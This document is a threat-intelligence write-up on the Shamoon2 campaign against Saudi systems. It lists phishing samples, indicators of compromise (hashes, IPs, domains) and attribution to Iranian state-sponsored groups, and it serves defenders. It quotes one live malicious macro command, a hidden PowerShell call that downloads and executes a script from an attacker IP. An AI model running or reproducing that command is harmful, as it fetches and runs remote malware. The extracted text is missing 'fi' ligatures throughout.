Additional Insights on Shamoon2

IBM analysts recently unveiled a rst look at how threat actors may have placed
Shamoon2 malware on systems in Saudi Arabia. Researchers showcased a
potential malware lifecycle which started with spear phishing and eventually led to
the deployment of the disk-wiping malware known as Shamoon. Their research
showcased a set of downloaders and domains that could potentially lead to a more
extensive malware distribution campaign.
While researching elements in the IBM report, ASERT discovered additional
malicious domains, IP addresses, and artifacts. The basic functionality of the new
documents and their PowerShell components matched what was previously
disclosed. For more information on the overall capabilities of the malware, please
review IBM’s ongoing research. It is our hope that by providing additional
indicators, end-point investigators and network defenders will be able to discover
and mitigate more Shamoon2 related compromises.
Initial Discoveries
The following new samples were likely delivered via similar spear phishing
campaigns as described in IBM’s research. All three shared the same IPs and URLs,
also provided below. These samples were located by pivoting on document
attributes. In this case, a sample from the IBM report indicated the document
author ‘gerry.knight’ which led us to the following three additional samples. MD5

The following is a screenshot of a macro-enabled document captured from sample
5e5ea1a67c2538dbc01df28e4ea87472:

Once enabled the extracted macro executed the following:
‘powershell.exe -w hidden -noni -nop -c “iex(New-Object
System.Net.WebClient).DownloadString(\’http://69.87.223.26:8080/p\’)”‘
Pivoting on Passive DNS

From the previous samples, we performed a passive DNS lookup on the IPs. We
found get.adobe.go-microstf[.]com hosted at 104.218.120[.]128 around the time
this campaign was ongoing, November 2016.
Researching the domain go-microstf[.]com, hosted at 45.63.10[.]99, revealed yet
another iteration of malicious executables. In this case, a URL used to download
the PowerShell component shared a naming convention found in the IBM report,
http://69.87.223[.]26:8080/eiloShaegae1 and connected to the IP address used by
the previous three samples. The following are IOCs related to this domain:
MD5
83be35956e5d409306a81e88a1dc89fd
IPs
45.63.10[.]99
69.87.223[.]26
URLs
go-microstf[.]com
69.87.223[.]26:8080/eiloShaegae1
go-microstf[.]com/check le.aspx
The domain go-microstf[.]com was originally set up to spoof Google Analytics login
page. The following screenshot is from the malicious domain:

Possible Connections to Iranian state-sponsored Kittens
Finally, research yielded a relatively unique sample. This particular iteration was
submitted to VirusTotal on September 16, 2016. The majority of samples analyzed
to date were submitted no earlier than mid-October, with most being submitted in
January 2017 or later. We were able to discover this particular version by diving
further into connections to analytics-google[.]org. Unlike newer samples, this one
created a unique le ‘sloo.exe’. The le was created at C:\Documents and
Settings\Admin\Local Settings\Temp\sloo.exe. In addition to this le, the sample
also contacted 104.238.184[.]252 for the PowerShell executable.
Researchers at Palo Alto have attributed sloo.exe and related activities to threat
actors of a likely Iranian state-sponsored origin which they’ve named Magic Hound.
The group Magic Hound is linked via infrastructure and tools to the Rocket Kitten
threat actor group although Palo Alto cannot con rm the extent of any relationship
between the two groups.

Dell Secureworks analysts recently concluded that domains discussed in the IBM
report were linked to the Iranian PupyRAT usage. In addition, Dell analysts have
assessed with high-con dence these activities are attributable to Iranian statesponsored activities.
IOCs for this version were:
MD5
07d6406036d6e06dc8019e3ade6ee7de
IPs
104.238.184[.]252
5.254.100[.]200
URLs
analytics-google[.]org:69/checkFile.aspx
Conclusion
These additional IOCs will hopefully provide more context into the ongoing threat.
The link to possible Iranian threat actors supports ongoing analysis that Shamoon2
was perpetrated by Iranian state-sponsored threat actors. The last sample
discussed may be malware-0 or at least part of the overall development and
subsequent deployment of tools used to install Shamoon on Saudi systems.
